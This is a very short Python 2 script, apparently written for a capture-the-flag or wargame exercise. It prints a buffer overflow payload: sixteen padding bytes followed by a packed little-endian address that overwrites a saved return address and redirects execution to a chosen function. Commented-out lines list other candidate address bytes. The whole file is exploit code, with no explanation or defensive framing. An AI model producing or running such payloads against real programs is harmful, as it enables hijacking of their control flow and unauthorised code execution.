from struct import pack

print '\x00'*16+pack("<I", 0x08048efe)


# + '\x08' + '\x04' + '\x8e' + '\xfe'
# + '\xef' + '\xe8' + '\x40' + '\x80'
# '\xbf' + '\xfe' + '\x95' + '\xb8'
# '\x8b' + '\x59' + '\xef' + '\xfb'
